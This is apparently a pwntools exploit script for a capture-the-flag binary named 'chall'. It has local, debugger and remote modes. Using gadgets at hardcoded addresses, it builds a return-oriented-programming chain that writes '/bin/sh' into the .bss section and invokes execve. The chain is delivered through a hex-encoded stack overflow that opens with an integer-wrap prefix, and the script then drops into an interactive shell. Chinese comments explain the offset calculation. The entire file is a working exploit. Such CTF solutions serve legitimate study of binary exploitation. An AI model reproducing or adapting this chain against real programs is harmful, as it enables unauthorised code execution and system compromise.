import argparse
import sys
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument(
    "mode",
    type=int,
    choices=[0, 1, 2],
    nargs="?",
    default=0,
    help="0=local,1=local+gdb,2=remote",
)
args = parser.parse_args()

filename = "./chall"
libc_name = ""
arch = "amd64"
remote_addr = "localhost"
remote_port = "13339"

context(log_level="debug", os="linux", arch=arch)
if args.mode < 2:
    context.terminal = ["tmux", "splitw", "-h"]

def VIO_TEXT(x, code=95):
    return log.info(f"\x1b[{code}m{x}\x1b[0m")

def CLEAR_TEXT(x, code=32):
    return log.success(f"\x1b[{code}m{x}\x1b[0m")

if args.mode == 0:
    io = process(filename)
    print(CLEAR_TEXT("[*] Running on local machine"))
elif args.mode == 1:
    io = process(filename)
    gdb.attach(
        io,
        gdbscript='''
        b *0x401b79
        b *0x401ba5
        c
        ''',
    )
elif args.mode == 2:
    io = remote(remote_addr, remote_port)
else:
    sys.exit(1)

elf = ELF(filename, checksec=False)
if libc_name:
    libc = ELF(libc_name, checksec=False)


# ready to write 
stdin_addr=0x4ca440
bss_base=elf.bss()
bin_sh_addr=bss_base+0x100 
writeable_addr=bss_base+0x500

# gadgets 
pop_rdi_rbp_ret=0x402418 
pop_rsi_ret=0x43617e 
pop_rax_ret=0x4303aa 
pop_rbx_ret=0x451478 
set_rdx_addr=0x4872e0 # mov edx,[rsi]; mov [rdi],edx ; ret
write_mem_addr=0x422b62+1 # aaa ; mov qword [rdi+rdx-0x08],rsi; due to aaa thus plus 1
syscall_addr=0x415d36 
pop_rbp_ret=0x484351
# rop chain 

rop=flat(
    pop_rsi_ret,bss_base, 
    pop_rdi_rbp_ret,writeable_addr,0xdeadbeef, 
    set_rdx_addr, 
    pop_rsi_ret,b"/bin/sh\x00",
    pop_rdi_rbp_ret,bin_sh_addr+8,0xdeadbeef, # due to write_mem
    write_mem_addr,
    pop_rdi_rbp_ret,bin_sh_addr,0xdeadbeef,
    pop_rsi_ret,0x0, # 清空 
    pop_rax_ret,0x3b, # execve 
    syscall_addr
)

payload=b"04294967297:"
# \xa7字节，此时刚好指向rop链，不然copy过去buf在返回的时候会炸，可以嗯调也可以算rsp和rbp+8在返回的时候相差168字节。
# 在这里就是1+167跳转过去
overflow=b"a"*72+p64(stdin_addr)+b"a"*8+b"\xa7"+rop
payload+=overflow.hex().encode()+b"."
io.sendline(payload)

io.interactive()
